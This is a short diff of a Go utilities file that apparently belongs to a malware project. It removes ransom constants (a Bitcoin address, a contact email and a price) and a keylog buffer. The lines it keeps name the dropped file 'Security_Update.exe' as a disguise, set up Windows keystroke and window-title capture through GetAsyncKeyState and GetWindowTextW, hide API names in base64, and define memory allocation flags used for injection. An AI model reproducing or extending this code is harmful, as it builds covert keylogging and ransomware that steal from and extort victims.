@@ -3,9 +3,6 @@ package utils
 import "syscall"
 import "../base64"
 
-const BTC_ADDRESS = "1W4t3596k4ijyihjgohol"
-const EMAIL = "example@company.com"
-const PRICE = 600
 const TARGET_FILE_NAME = "Security_Update.exe"
 const MEM_COMMIT = 0x1000
 const MEM_RESERVE = 0x2000
@@ -23,7 +20,6 @@ var User32 = syscall.NewLazyDLL("user32.dll")
 var ProcGetAsyncKeyState = User32.NewProc("GetAsyncKeyState")
 var ProcGetForegroundWindow = User32.NewProc("GetForegroundWindow") //GetForegroundWindow
 var ProcGetWindowTextW = User32.NewProc("GetWindowTextW")           //GetWindowTextW
-var TmpKeylog string
 
 var K32 = syscall.NewLazyDLL(base64.Decode("a2VybmVsMzIuZGxs"))
 var GetAsyncKeyState = User32.FindProc(base64.Decode("R2V0QXN5bmNLZXlTdGF0ZQ=="))
